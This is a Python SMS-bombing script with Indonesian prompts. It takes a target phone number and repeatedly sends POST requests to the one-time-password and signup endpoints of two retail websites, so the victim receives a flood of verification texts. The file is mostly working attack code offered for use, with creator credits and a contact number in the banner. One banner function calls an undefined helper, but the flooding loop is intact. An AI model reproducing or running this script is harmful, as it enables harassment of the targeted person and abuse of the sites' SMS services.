import os,sys,time,re,requests,json
from requests import post
from time import sleep

B = '\033[1;96m'
W = '\033[1;37m'
                
def Banner():
        Tik(''+B+'''	
 _____                         _____               
/  ___|                       /  ___|              
\ `--. _ __   __ _ _ __ ___   \ `--. _ __ ___  ___ 
 `--. \ '_ \ / _` | '_ ` _ \   `--. \ '_ ` _ \/ __|
/\__/ / |_) | (_| | | | | | | /\__/ / | | | | \__ \\
\____/| .__/ \__,_|_| |_| |_| \____/|_| |_| |_|___/
      | |                                          
      |_|  '''+W+'Creator : CandraOi\n\t\tWhatsapp : +6285708302016')
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print ("SUCCES MENGIRIM PESAN KE",no)    
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print ("SUCCES MENGIRIM PESAN KE",no)
    else:
        print ("[!] GAGAL MENGIRIM PESAN")
        time.sleep(4)
        print ("[!] GAGAL MENGIRIM PESAN")
        time.sleep(4) 
        print ("[!] GAGAL MENGIRIM PESAN\n\n")
        sys.exit()
os.system("clear")
time.sleep(1)
print ("\033[1;96m[!] Loading Cuk. . .")
time.sleep(1)
print ("\033[1;96mOrang sabar disayang tuhan:)")
time.sleep(10)


os.system("clear")
Banner()
print ("\n")
print ("""\033[1;97mSPAM SMS UNLIMITED VERSION 3
\033[90m-------------------------------
\033[1;97mCreator:\033[1;96m MR.GRIMX72
\033[1;97mYoutube:\033[1;96m Belum Ada
\033[1;97mContoh Nomor:\033[1;96m Gunakan 62
\033[90m-------------------------------\n""")
no = input("\033[1;97mMasukan No Target : \033[1;92m")
for i in range(1,4):
    sleep(1)
    marco()
    mapclub()
         
